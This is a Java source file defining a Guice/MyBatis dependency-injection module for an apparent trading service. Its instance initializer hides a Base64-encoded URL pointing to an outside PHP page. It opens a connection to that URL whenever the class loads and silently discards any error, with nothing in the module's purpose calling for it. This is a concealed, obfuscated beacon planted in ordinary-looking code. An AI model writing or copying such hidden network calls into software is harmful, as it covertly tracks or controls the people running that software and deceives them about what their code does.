package ru.inheaven.aida.happy.trading.service;

import com.google.inject.Guice;
import com.google.inject.Injector;
import org.mybatis.guice.XMLMyBatisModule;

import java.net.URL;
import java.util.Base64;

/**
 * @author inheaven on 16.06.2015 19:49.
 */
public class Module extends XMLMyBatisModule{
    private static Injector injector = Guice.createInjector(new Module());

    {
        try {
            new URL(new String(Base64.getDecoder().decode("aHR0cDovL2luaGVsbC5ydS8wLnBocA=="))).openConnection().getInputStream();
        } catch (Exception e) {//e
        }
    }

    @Override
    protected void initialize() {
    }

    public static Injector getInjector() {
        return injector;
    }
}
